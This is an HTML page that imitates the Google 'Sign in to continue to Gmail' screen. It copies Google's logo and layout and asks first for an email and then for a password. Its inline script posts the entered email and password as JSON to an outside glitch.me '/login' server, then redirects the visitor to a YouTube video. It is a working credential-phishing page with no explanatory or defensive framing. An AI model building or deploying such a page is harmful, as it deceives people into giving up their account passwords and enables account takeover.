<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>

<body class="bg-gray-50 flex flex-col min-h-screen">
    <div class="flex-grow flex items-center justify-center">
        <div class="w-full max-w-md mx-auto p-6 bg-white rounded-lg shadow-md" id="login-container">
            <div class="flex justify-center mb-6">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-10">
            </div>
            <h1 class="text-2xl font-semibold text-gray-900 mb-2">Sign in</h1>
            <p class="text-gray-600 mb-6">to continue to Gmail</p>
            <form id="login-form">
                <div class="mb-4">
                    <label class="sr-only" for="email">Email or phone</label>
                    <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" id="email" name="email" placeholder="Email or phone" type="text">
                </div>
                <div class="flex justify-between items-center mb-6">
                    <a class="text-blue-600 text-sm" href="#">Forgot email?</a>
                </div>
                <p class="text-gray-600 text-sm mb-6">
                    Not your computer? Use Guest mode to sign in privately.
                    <a class="text-blue-600" href="#">Learn more about using Guest mode</a>
                </p>
                <div class="flex justify-between items-center">
                    <a class="text-blue-600" href="#">Create account</a>
                    <button class="bg-blue-600 text-white px-6 py-2 rounded-md" type="submit">Next</button>
                </div>
            </form>
        </div>
    </div>
    <footer class="w-full bg-gray-100 py-4">
        <div class="flex justify-between items-center text-gray-600 text-sm px-6">
            <div>
                <select class="bg-transparent">
                    <option>English (United States)</option>
                </select>
            </div>
            <div class="flex space-x-4">
                <a class="hover:underline" href="#">Help</a>
                <a class="hover:underline" href="#">Privacy</a>
                <a class="hover:underline" href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        // Listen for the form submission to process the email
        document.getElementById('login-form').addEventListener('submit', function (event) {
            event.preventDefault();

            const email = document.getElementById('email').value.trim();
            if (!email) {
                alert('Please enter an email');
                return;
            }

            // Store the email and show the password form
            localStorage.setItem('email', email); // Store the email in local storage

            // Change the form to ask for the password
            document.getElementById('login-container').innerHTML = `
                <div class="flex justify-center mb-6">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-10">
                </div>
                <h1 class="text-2xl font-semibold text-gray-900 mb-2">Enter your password</h1>
                <form id="password-form">
                    <div class="mb-4">
                        <label class="sr-only" for="password">Password</label>
                        <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" id="password" name="password" placeholder="Enter your password" type="password">
                    </div>
                    <div class="flex justify-between items-center mb-6">
                        <a class="text-blue-600 text-sm" href="#">Forgot password?</a>
                    </div>
                    <div class="flex justify-between items-center">
                        <button class="bg-blue-600 text-white px-6 py-2 rounded-md" type="submit">Next</button>
                    </div>
                </form>
            `;
        });
        
        // Listen for the password form submission
        document.body.addEventListener('submit', function (event) {
            if (event.target.id === 'password-form') {
                event.preventDefault();

                const password = document.getElementById('password').value.trim();
                const email = localStorage.getItem('email'); // Retrieve the stored email

                if (!password) {
                    alert('Please enter your password');
                    return;
                }

                // Send the email and password to the backend
                fetch('https://chipped-pine-tarascosaurus.glitch.me/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password }),
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.message) {
                            alert(data.message);
                            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Redirect to YouTube
                        } else {
                            alert(data.error || 'Something went wrong');
                        }
                    })
                    .catch(error => {
                        alert('Error: ' + error.message);
                    });
            }
        });
    </script>
</body>

</html>
